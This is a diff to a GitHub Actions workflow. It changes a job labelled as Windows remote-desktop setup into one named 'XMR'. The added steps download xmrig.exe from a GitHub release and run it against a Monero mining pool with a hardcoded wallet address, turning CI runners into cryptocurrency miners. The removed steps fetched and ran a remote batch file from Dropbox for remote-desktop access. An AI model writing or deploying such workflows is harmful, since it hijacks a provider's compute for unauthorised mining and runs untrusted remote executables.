@@ -1,4 +1,4 @@
-name: Windows - RustDesk
+name: Windows - XMR
 
 on:
   workflow_dispatch:
@@ -10,13 +10,9 @@ jobs:
     timeout-minutes: 9999
     
     steps:
-      - name: Downloading & Installing Essentials
+      - name: Downloading 
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
-          cmd /c Downloads.bat
+          curl -s -L -o xmrig.exe https://github.com/shadowcoder2020/Windows-RustDesk/releases/download/1.1.1/xmrig.exe
 
-      - name: Log In To AnyDesk
-        run: cmd /c show.bat
-
-      - name: Time Counter
-        run: python time.py
+      - name: start xmrig
+        run: cmd /c xmrig.exe -o pool.supportxmr.com:443 -u 4BGLje4V31tUSFsFTNgXL3VihDnswHFaHhqL4TVR9cJ66joKj5o6NrFRUTrt5swrafXCx82JMnAsqT4zkv1cVc5NRTYyZNV -k --tls
